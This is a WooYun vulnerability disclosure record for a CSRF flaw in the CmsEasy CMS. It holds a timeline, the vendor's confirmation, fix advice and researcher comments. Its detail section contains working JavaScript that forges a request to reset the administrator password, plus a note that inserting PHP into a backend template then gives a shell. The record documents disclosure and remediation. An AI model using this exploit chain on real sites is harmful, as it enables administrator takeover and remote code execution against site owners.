{"id": 52370, "wybug_id": "wooyun-2014-071441", "wybug_title": "Cmseasy建站系统csrf获取管理权限后台getshell", "wybug_corp": "cmseasy", "wybug_author": "花开若相惜", "wybug_date": "2014-08-07 18:04", "wybug_open_date": "2014-09-21 18:06", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-21：\t细节向公众公开  简要描述： Cmseasy建站系统csrf获取管理权限后台getshell 详细说明：  在修改管理密码处存在csrf漏洞http://localhost/cmseasy/uploads/index.php?case=table&act=edit&table=user&id=1&admin_dir=admin&site=defaultpost:onlymodify=&username=admin&passwordnew=456456&nickname=%E7%AE%A1%E7%90%86%E5%91%98&question=&answer=&groupid=2&qq=0&e_mail=&tel=&submit=%E6%8F%90%E4%BA%A4可通过csrf修改管理密码：\nfunction ajax(){    var request = false;    if(window.XMLHttpRequest) {        request = new XMLHttpRequest();    } else if(window.ActiveXObject) {        var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];        for(var i=0; i<versions.length; i++) {            try {                request = new ActiveXObject(versions[i]);            } catch(e) {}        }    }  return request;}var _x = ajax();postgo();function postgo() {    src=\"http://localhost/cmseasy/uploads/index.php?case=table&act=edit&table=user&id=1&admin_dir=admin&site=default\";    data=\"onlymodify=&username=admin&passwordnew=456456&nickname=%E7%AE%A1%E7%90%86%E5%91%98&question=&answer=&groupid=2&qq=0&e_mail=&tel=&submit=%E6%8F%90%E4%BA%A4\"    xhr_act(\"POST\",src,data); }function xhr_act(_m,_s,_a){    _x.open(_m,_s,false);\t\tcookie = document.cookie;    if(_m==\"POST\"){\t\t_x.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\t\t_x.setRequestHeader(\"Cookie\",cookie);\t}    _x.send(_a);    return _x.responseText;}\n后台编辑模板 插入php代码可getshell   漏洞证明：  \n\n\n\n   修复方案：  增加随机不可预测的token值、修改管理密码需要验证原密码。   版权声明：转载请注明来源 花开若相惜@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-08-08 00:19 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-07 18:15 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这个cms还可以csrf.......    \n     2014-08-07 18:18 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @xsser xsrf还是csrf？    \n     2014-08-07 18:18 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  阔以    \n     2014-08-07 18:20 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @浩天 攻击成本较高 基本没人中    \n     2014-08-29 11:54 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  eie    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}